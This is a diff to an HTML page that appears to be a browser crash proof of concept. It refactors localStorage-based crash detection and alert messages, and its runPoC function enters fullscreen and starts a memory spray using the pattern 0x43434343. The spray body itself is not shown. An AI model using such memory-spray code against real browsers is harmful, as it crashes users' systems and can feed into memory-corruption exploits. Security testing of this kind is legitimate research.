@@ -153,34 +153,39 @@ body {
 </div>
 <script>
 window.onload = () => {
-  const flag = localStorage.getItem("crashFlag");
-  const time = parseInt(localStorage.getItem("crashTime") || "0");
-  const now = Date.now();
-  const elapsed = Math.floor((now - time) / 1000);
+  requestAnimationFrame(() => {
+    const pending = localStorage.getItem("crashPending");
+    const startTime = parseInt(localStorage.getItem("crashStartTime") || "0");
+    const now = Date.now();
+    const elapsed = Math.floor((now - startTime) / 1000);
 
-  // Solo si hubo intento previo y han pasado 6+ segundos
-  if (flag === "1" && elapsed >= 6 && elapsed < 300) {
-    let count = parseInt(localStorage.getItem("crashCount") || "0");
-    count++;
-    localStorage.setItem("crashCount", count.toString());
+    // Mostrar solo si estaba pendiente Y han pasado al menos 6 segundos (pero no más de 5 min)
+    if (pending === "1" && elapsed >= 6 && elapsed < 300) {
+      let count = parseInt(localStorage.getItem("crashCount") || "0");
+      count++;
+      localStorage.setItem("crashCount", count.toString());
 
-    alert(`⚠️ Last run may have triggered instability or crash.\n⏱ Elapsed: ${elapsed}s\n💥 Total crashes detected: ${count}`);
-    
+      alert(
+        `⚠️ Last run may have triggered instability or crash.\n` +
+        `⏱ Elapsed: ${elapsed}s\n` +
+        `💥 Total crashes detected: ${count}`
+      );
+    }
+
     // Limpieza
-    localStorage.removeItem("crashFlag");
-    localStorage.removeItem("crashTime");
-  }
+    localStorage.removeItem("crashPending");
+    localStorage.removeItem("crashStartTime");
+  });
 };
 
 function runPoC() {
   document.getElementById("message").textContent =
     "Fullscreen activated...\nSpraying memory...";
 
-  // Guardamos marca de posible crash
-  localStorage.setItem("crashFlag", "1");
-  localStorage.setItem("crashTime", Date.now().toString());
+  // Guardar datos de posible crash
+  localStorage.setItem("crashPending", "1");
+  localStorage.setItem("crashStartTime", Date.now().toString());
 
-  // Esperamos medio segundo para asegurarnos que se guarda
   setTimeout(() => {
     document.body.requestFullscreen().then(() => {
       const PATTERN = 0x43434343;
@@ -211,6 +216,7 @@ function runPoC() {
   }, 500);
 }
 </script>
+
 
 
 
